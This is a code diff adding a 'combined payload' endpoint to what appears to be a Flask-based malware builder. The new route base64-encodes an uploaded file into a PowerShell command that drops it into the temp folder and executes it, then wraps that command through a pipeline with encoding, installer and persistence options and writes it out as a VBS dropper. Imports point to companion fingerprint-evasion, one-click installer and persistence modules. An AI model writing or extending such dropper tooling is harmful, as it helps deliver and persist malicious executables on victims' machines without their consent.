@@ -21,6 +21,7 @@ from payload_generator import PayloadGenerator
 from fingerprint_manager import FingerprintManager
 from payload_installer import create_one_click_payload
 from persistence_manager import create_persistent_payload
+from combined_pipeline import CombinedPipeline, generate_combined_payload
 
 logger = logging.getLogger(__name__)
 
@@ -725,6 +726,77 @@ def generate_persistent_payload():
     except Exception as e:
         logger.exception('Persistent payload generation failed')
         return jsonify({'error': _safe_error_message('Persistent payload generation failed', e)}), 500
+
+
+@app.route('/api/combined-options', methods=['GET'])
+def get_combined_options():
+    """Get available combined pipeline options and presets"""
+    options = CombinedPipeline.get_available_options()
+    presets = CombinedPipeline.get_presets()
+    return jsonify({'options': options, 'presets': presets})
+
+
+@app.route('/api/generate-combined', methods=['POST'])
+def generate_combined():
+    """Generate a combined payload through the multi-stage pipeline"""
+    data = request.json
+    file_id = data.get('file_id')
+    preset = data.get('preset')
+    encoding = data.get('encoding')
+    installer = data.get('installer')
+    persistence = data.get('persistence')
+
+    if not file_id:
+        return jsonify({'error': 'File ID required'}), 400
+
+    try:
+        uploaded_file = _find_uploaded_file(file_id)
+
+        if not uploaded_file or not os.path.exists(uploaded_file):
+            return jsonify({'error': 'File not found'}), 404
+
+        with open(uploaded_file, 'rb') as f:
+            file_content = f.read()
+
+        encoded_file = base64.b64encode(file_content).decode()
+        filename = os.path.basename(uploaded_file)
+        cmd = (
+            f'powershell -NoProfile -Command '
+            f'"$f=\'$env:temp\\\\{filename}\'; '
+            f'[System.IO.File]::WriteAllBytes($f, '
+            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
+            f'& $f"'
+        )
+
+        result = generate_combined_payload(
+            cmd,
+            preset=preset,
+            encoding=encoding,
+            installer=installer,
+            persistence=persistence,
+        )
+
+        output_id = str(uuid.uuid4())[:8]
+        output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_combined.vbs")
+
+        with open(output_path, 'w') as f:
+            f.write(result['combined_payload'])
+
+        return jsonify({
+            'success': True,
+            'output_id': output_id,
+            'payload': result['combined_payload'],
+            'size': result['metadata']['total_size'],
+            'stages': result['stages'],
+            'metadata': result['metadata'],
+            'timestamp': datetime.now().isoformat(),
+        })
+
+    except ValueError as e:
+        return jsonify({'error': str(e)}), 400
+    except Exception as e:
+        logger.exception('Combined payload generation failed')
+        return jsonify({'error': _safe_error_message('Combined payload generation failed', e)}), 500
 
 
 if __name__ == '__main__':
